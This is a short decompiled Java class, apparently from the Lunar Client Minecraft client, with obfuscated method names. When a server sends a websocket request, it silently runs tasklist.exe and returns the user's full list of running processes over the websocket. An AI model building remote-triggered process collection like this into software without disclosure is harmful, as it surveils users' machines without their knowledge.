package com.moonsworth.lunar.client.websocket.packet;

import com.moonsworth.lunar.bridge.minecraft.client.network.PacketBufferBridge;
import com.moonsworth.lunar.client.websocket.AssetsWebSocket;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class WSPacketRequestProcessList extends AbstractWebSocketPacket {
    public void IlllIIIIIIlllIlIIlllIlIIl(final PacketBufferBridge packetBufferBridge) {
    }

    public void lIllIlIIIlIIIIIIIlllIlIll(final PacketBufferBridge packetBufferBridge) {
    }

    @Override
    public void lIlIlIlIlIIlIIlIIllIIIIIl(final AssetsWebSocket assetsWebSocket) {
        try {
            final ArrayList<String> list = new ArrayList<String>();
            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\tasklist.exe").getInputStream()));
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                list.add(line);
            }
            bufferedReader.close();
            assetsWebSocket.lIlIlIlIlIIlIIlIIllIIIIIl(new WSPacketClientProcessList(list));
        } catch (Exception ex) {}
    }
}
